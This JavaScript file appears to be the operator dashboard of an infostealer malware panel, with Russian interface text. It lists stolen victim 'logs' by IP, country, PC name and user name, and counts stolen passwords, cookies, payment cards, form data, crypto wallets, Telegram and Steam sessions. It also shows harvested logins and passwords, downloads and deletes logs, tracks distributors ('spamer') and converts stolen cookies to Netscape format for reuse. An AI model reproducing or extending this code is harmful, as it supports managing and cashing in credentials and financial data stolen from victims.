function sendData(url, data, convert) {
	result = false;
	$.ajax({
		type: "POST",
		async: false,
		url: url,
		data: data,
		success: function(data) {
			data = convert==undefined ? JSON.parse(data) : data;
			result = data;
		},
		error: function(jqXHR, textStatus, errorThrown) {
			swal.fire({
				icon: "error",
				title: "Ошибка",
				text: "Произошла ошибка при попытке соединения с сервером (" + textStatus + "). Попробуйте перезагрузить страницу",
				customClass: {
					popup: 'swal-popup-class',
					title: 'swal-title-class',
				}
			});
		},
	});

	return result;
}

function CheckData(data) {
	if(Array.isArray(data[0]) == false) {
		if(data[0].success == false) {
			swal.fire({
				customClass: {
					popup: 'swal-popup-class',
					title: 'swal-title-class',
				},
				icon: "error",
				title: 'Ошибка',
				text: data[0].error_text,
			});

			return false;
		}
		return data[0];
	}
	else if(data[0].length > 0) {
		text = "";
		for(i = 0; i < data[0].length; i++)
			if(data[0][i].success == false)
				text += data[0][i].error_text + "\r\n";


		if(text != "") {
			swal.fire({
				type: "error",
				title: 'Ошибки',
				text: "Произошло несколько ошибок: \r\n" + text,
		        customClass: {
					popup: 'swal-popup-class',
					title: 'swal-title-class',
				},
			});

			return false;
		}
		return true;
	}
}

var table;

var logs_tag;
var logs_spamer;
var logs_last;

var extra_info = [];

function TableLogsInit(dom) {

	cols = [
        {
			responsivePriority: 1,
			className: 'details-control',
			orderable: false,
			data: "id",
			defaultContent: '',
			render: function(data, type, row) {
				return "<input type='hidden' value='" + data + "'>";
			}
		},
	];
	if(logs_last != "last") {
		cols.push(
        { 
        	responsivePriority: 3,
        	orderable: false,
        	data: "id",
        	render: function(data, type, row) {
        		return "<div class=\"custom-control custom-checkbox text-center\"><input type=\"checkbox\" name=\"Check" + data + "\" class=\"custom-control-input table-checkbox\" id=\"Check" + data + "\"><label class=\"custom-control-label table-checkbox-label\" for=\"Check" + data + "\"></label></div>";
		    }
        });
	}

	cols.push.apply(cols, [
        { 
        	responsivePriority: 5,
        	orderable: false,
        	data: function(row, type, val, meta) {
        		return meta.row + 1;
        	} 
        },
        { 
        	responsivePriority: 6,
        	data:  "address[]",
            render: function(data, type, row) {
            	if(type == "display") {
					return "<div class='d-flex align-items-center justify-content-between'><div><span>Страна: " + data[0] + "(" + data[1] + ")</span><br><span>IP: " + data[2] + "</span></div><img class='country-img' data-placement=\"top\" data-toggle='tooltip' title='Страна: " + data[0] + "' src='/public/img/countryflags/" + data[1] + ".png' /></div>";
            	}
		        else {
		        	return data[1];
		        }
            	
            },
            type: "string",
        },
        { 
        	responsivePriority: 2,
        	data: function ( row, type, val, meta ) {
        		return row['data'];
        	},
        	render: function(data, type, row) {
        		if(type == "display") {
        			result = "<i class='fal fa-key table-data-icon' data-placement=\"top\" data-toggle='tooltip' title='Пароли'></i> " + data['passwords'] + " " +
                    "<i class='fal fa-cookie-bite table-data-icon' data-placement=\"bottom\" data-toggle='tooltip' title='Куки'></i> " + data['cookies'] + " " +
                    "<i class='fal fa-credit-card-front table-data-icon' data-placement=\"top\" data-toggle='tooltip' title='Карты'></i> " + data['cards'] + " " +
                    "<i class='fal fa-address-card table-data-icon' data-placement=\"bottom\" data-toggle='tooltip' title='Формы'></i> " + data['forms'] + ' ' +
                    "<i class='fal fa-wallet table-data-icon' data-placement=\"top\" data-toggle='tooltip' title='Кошельки'></i> " + data['wallets'] + ' ' +
                    "<i class='fab fa-telegram-plane table-data-icon' data-placement=\"bottom\" data-toggle='tooltip' title='Телеграм'></i> " + data['telegram'] + ' ' +
                    "<i class='fab fa-steam table-data-icon' data-placement=\"top\" data-toggle='tooltip' title='Стим'></i> " + data['steam'] + "<br>";
            		
            		if(data['dds_passwords'].length > 0) {
            			for(i in data['dds_passwords']) {
	            			result += "<span class='" + (i!=0?"ml-1 ":"") + "mt-1 badge badge-info'><i class='fal fa-key'></i> " + data['dds_passwords'][i] + "</span>";
	            		}

            			result += "<br>";
            		}
            		

            		for(i in data['dds_cookies']) {
            			result += "<span class='" + (i!=0?"ml-1 ":"") + "mt-1 badge badge-warning'><i class='fal fa-cookie-bite'></i> " + data['dds_cookies'][i] + "</span>";
            		}
            		return result;
        		}
                else
                	return data;
        	},
        	type: "num", 
        },
        { 
        	responsivePriority: 4,
        	data: "date" 
        },
        { 
        	responsivePriority: 8,
        	data: "size", 
        	type: "num", 
        },
        { 
        	orderable: false,
        	responsivePriority: 7,
        	data: "screenshot", 
        	render: function(data, type, row) {
    			return "<a href=\"" + data + "\" class=\"logs-screen\"><img src=\"" + data + "\"></a>";
        	},
        },
        { 
        	responsivePriority: 1,
        	orderable: false,
        	data: "file[]",
        	render: function(data, type, row) {
        		return get_instrument_to_log(data[0], data[1], false);
        	},
        }
    ]);

	table = $(".logs_table").DataTable({
    	dom: dom,
    	ajax: {
            "url": "/logs/getTable/logs",
            "type": "POST",
            "data": function ( d ) {
                d.tag = logs_tag;
                d.spamer = logs_spamer;
                d.type = logs_last;
            }
        },
        columns: cols,
        responsive: {
            details: false
        },
        order: [[ 4, "desc" ]],
    });
}

$(".logs_table").on( 'draw.dt', function () {
	console.log("table draw");
    $(".logs_table [data-toggle=\"tooltip\"]").tooltip({
        delay: { "show": 100, "hide": 1000 }
    });

    $(".logs-screen").magnificPopup({type:"image"});

    $('.logs_table tbody').on('click', 'td.details-control', function () {

        var tr = $(this).closest('tr');
        var row = table.row(tr);
        var id = $(this).find("input").val();
 
        if (row.child.isShown()) {
            // This row is already open - close it
            row.child.hide();
            tr.removeClass('shown');
        }
        else {
            // Open this row
            index = extra_info.indexOf(id);

        	if(index != -1)
	    		return;
	    	else {
	    		extra_info.push(id);
	    		index = extra_info.indexOf(id);
	    	}

        	data = CheckData(sendData("/logs/getTable/log", {"id": id}));
        	if(data) {
        		row.child(log_info_format(data)).show();
	            tr.addClass('shown');
        	}

        	extra_info.splice(index, 1);
        }
    });
});

$.extend(true, $.fn.dataTable.defaults, {
    autoWidth: false,
	processing: true,
	language: {
	    "emptyTable": "Нет данных",
	    "zeroRecords": "Ничего не найдено",
	    "info": "Показана страница _PAGE_ из _PAGES_",
	    "loadingRecords": "Загрузка данных...",
	    "paginate": {
	        "first": "Первая",
	        "last": "Последняя",
	        "next": "Следующая",
	        "previous": "Предыдущая"
	    },
	    "lengthMenu": "Показано _MENU_ записей",
	    "processing": "В процессе...",
	    "search": "Поиск:",
	},
	deferRender: true,
});

$(".file-upload-default").change(function() {
	str = "";
	arr = $(this).get(0).files;
	for(var i = 0; i < arr.length; i++) {
		str += arr[i]['name'];

		if(i != arr.length - 1) str += ", ";
	}
	$(this).parent().find('.form-control').val(str);
});

$(".file-upload-browse").click(function() {
	var file = $(this).parent().parent().parent().find('.file-upload-default');
	file.trigger('click');
});

function SuccessAlert(text) {
	swal.fire({
		customClass: {
			popup: 'swal-popup-class',
			title: 'swal-title-class',
		},
		icon: 'success',
		title: text,
		toast: true,
		position: 'bottom-end',
		showConfirmButton: false,
		timer: 3000,
		timerProgressBar: true,
		onOpen: (toast) => {
			toast.addEventListener('mouseenter', Swal.stopTimer)
			toast.addEventListener('mouseleave', Swal.resumeTimer)
		}
	});
}

function get_instrument_to_log(checked, id, show_info, show_checked, show_passwords) {
	checked = "<button href=\"javascript:void(0)\" class=\"btn " + (checked == "1"?'btn-info':'btn-purple') + " btn-block btn-sm\" onclick=\"toggle_check_log(this, " + id + ");\">" + (checked == "1"?'Проверено':'Новый лог') + "</button>";

	download = '<button style="margin-bottom: 5px;" class="btn btn-info downloadBtn" onclick="download_log(' + id + ');" href="javascript:void(0)"><i class="fas fa-file-download" data-toggle="tooltip" data-placement="bottom" title="Скачать лог(-и)"></i></button>';

	delete_btn = '<button style="margin-bottom: 5px;" class="btn btn-danger" onclick="delete_log(' + id + ', this);" href="javascript:void(0)"><i class="fas fa-trash-alt" data-toggle="tooltip" data-placement="top" title="Удалить лог(-и)"></i></button>';

	passView = '<button style="margin-bottom: 5px;" href="javascript:void(0)" data-toggle="tooltip" data-placement="bottom" title="Просмотр паролей" class="btn btn-info" onclick="passwordsModal(' + id + ');"><i class="fas fa-lock"></i></button>';

	info = '<button style="margin-bottom: 5px;" href="javascript:void(0)" class="btn btn-info infobtn" onclick="LoadLogData(' + id + ');"><i class="fas fa-info"></i></button>';

	return "<div class=\"btn-group-vertical\">" + (show_checked==false?"":checked) + "<div class='btn-group'>" + download + (show_info==false?"":info) + (show_passwords==false?"":passView) + delete_btn + "</div></div>";
}

function toggle_check_log(element, id) {
	data = sendData("/logs/check/" + id, {}, false);
	$("button[onclick=\"toggle_check_log(this, " + id + ");\"]").each(function() {
		el = $(this);

		el.toggleClass("btn-info btn-purple");

		if(el.text() == 'Проверено') {
			el.text('Новый лог');
			el.title = 'Новый лог';
		}
		else {
			el.text('Проверено');
			el.title = 'Проверено';
		}
	});
}

function openUrl(url, post){
    if ( post ) {
        var form = $('<form/>', {
            action: url,
            method: 'POST',
            style: {
               display: 'none'
            }
        });

        for(var key in post) {
            form.append($('<input/>',{
                type: 'hidden',
                name: key,
                value: post[key]
            }));
        }

        form.appendTo(document.body);
        form.submit();

    } else {
        window.open( url );
    }
}

function download_log(id) {
	if(id != 0)
		openUrl("/logs/log/download", {"id": id});
	else {
    	ids = get_checked_table_ids();
    	if(ids.length > 0) {
    		data = sendData("/logs/log/download", {"ids": ids, "addditional": "prepare"});
			if(data) {
				data = CheckData(data);
				if(data) {
					openUrl("/logs/log/download", {"ids": ids, "addditional": data.file});
				}
			}
    	}
		else {
			swal.fire({
				icon: 'error',
				title: 'Ошибка',
				text: 'Вы не выбрали ни одного лога',
				customClass: {
					popup: 'swal-popup-class',
					title: 'swal-title-class',
				}
			});
		}
	}
}

function get_checked_table_ids() {
	ids = [];
	index = 0;
	$(".table-checkbox:checked").each(function() {
		ids[index] = ($(this).attr("id").substr(5));
		index++;
	});

	return ids;
}

function delete_log(id) {
	if(id != 0) {
		swal.fire({
			type: "warning",
			title: "Вы уверены?",
			text: "Если вы продолжите, то выбранный вами лог будет удален со всеми данными",
			showCancelButton: true,
	        confirmButtonText: 'Да, удалить',
	        cancelButtonText: 'Назад',
	        customClass: {
				popup: 'swal-popup-class',
				title: 'swal-title-class',
			},
	    }).then((result) => {
	        if (result.value) {
				data = sendData("/logs/log/delete", {"id": id});
				if(data) {
					if(CheckData(data)) {
						$("#informationModal").modal('hide');
						
						if(typeof update_page_data == 'function') 
							update_page_data();
					}
				}
			}
		});
	}
	else {
		swal.fire({
			type: "warning",
			title: "Вы уверены?",
			text: "Если вы продолжите, то выбранные вами логи будут удалены со всеми данными",
			showCancelButton: true,
	        confirmButtonText: 'Да, удалить',
	        cancelButtonText: 'Назад',
	        customClass: {
				popup: 'swal-popup-class',
				title: 'swal-title-class',
			},
	    }).then((result) => {
	        if (result.value) {
	        	ids = get_checked_table_ids();
	        	if(ids.length > 0) {
	        		data = sendData("/logs/log/delete", {"ids": ids});
					if(data) {
						if(CheckData(data)) {
							$("#informationModal").modal('hide');

							if(typeof update_page_data == 'function') 
								update_page_data();
						}
					}
	        	}
	        	else {
	        		swal.fire({
						icon: 'error',
						title: 'Ошибка',
						text: 'Вы не выбрали ни одного лога',
						customClass: {
							popup: 'swal-popup-class',
							title: 'swal-title-class',
						}
					});
	        	}
			}
		});
	}
}

function LoadLogData(id) {
	$("#passwordsModal").modal('hide');
	index = 0;
	data = CheckData(sendData("/logs/getTable/log", {"id": id}));
	if(data) {

		parent = $("#log_info_table_parent");
		parent.html(log_info_format(data, true));

    	$('[data-toggle="tooltip"]').tooltip();
	}
	$("#informationModal").modal();
}

function log_info_format(data, show_instruments) {
	return '<table class="table table-sm table-striped" style="background: transparent">' + 
		"<tr><td>IP</td><td>" + data.ip + "</td></tr>" +
    	"<tr><td>Страна</td><td>" + data.country + "</td></tr>" +
    	"<tr><td>Название PC</td><td>" + data.pc + "</td></tr>" +
    	"<tr><td>Имя пользователя</td><td>" + data.user + "</td></tr>" +
    	"<tr><td>Дата</td><td>" + data.date + "</td></tr>" + 
    	"<tr><td>Тэг</td><td>" + data.tag + "</td></tr>" + 
    	"<tr><td>Имя файла</td><td>" + data.file + "</td></tr>" + 
    	"<tr><td>Пароли</td><td>" + data.passwords + "</td></tr>" + 
    	"<tr><td>Куки</td><td>" + data.cookies + "</td></tr>" + 
    	"<tr><td>Карты</td><td>" + data.cards + "</td></tr>" + 
    	"<tr><td>Формы</td><td>" + data.forms + "</td></tr>" + 
    	"<tr><td>Кошельки</td><td>" + data.wallets + "</td></tr>" + 
    	"<tr><td>Steam</td><td>" + data.steam + "</td></tr>" + 
    	"<tr><td>Telegram</td><td>" + data.telegram + "</td></tr>" + 
    	"<tr><td>Размер</td><td>" + data.size + "</td></tr>" + 
    	"<tr><td>Спамер</td><td>" + data.spamer + "</td></tr>" + 
    	(show_instruments!=undefined?"<tr><td>Инструменты</td><td>" + get_instrument_to_log(data.checked, data.id, false) + "</td></tr>":"") +
    	"</table>";
}

function passwordsModal(id) {
	$("#informationModal").modal('hide');
	passwordsTable = $(".passwordsTable").DataTable({
    	dom: '<"d-sm-flex justify-content-between"lf>t<"d-sm-flex justify-content-end"p>',
        ajax: {
            "url": "/logs/getTable/passwords",
            "type": "POST",
            "data": function ( d ) {
                d.id = id;
            }
        },
        columns: [
            { data: "url" },
            { data: "login" },
            { data: "pass" },
            { data: "browser" },
            { 
            	data: "id",
            	render: function(data, type, row) {
            		return '<a style="margin-bottom: 5px;" href="javascript:void(0)" class="btn btn-info infobtn" onclick="LoadLogData(' + data + ');"><i class="fas fa-info"></i></a>';
            	},
            },
        ],
	});
	$("#passwordsModal").modal();
}

$('#passwordsModal').on('hidden.bs.modal', function (e) {
	passwordsTable.destroy();
});


function ConvertNetscape(element) {
	$(element).prop('disabled', true);

	if($("#netscape_text").val().length > 0) {
		data = sendData("/netscape", {"text": $("#netscape_text").val()}, false);
		if(data) {
			$("#netscape_text").val(data);
		}
	}

	$(element).prop('disabled', false);
}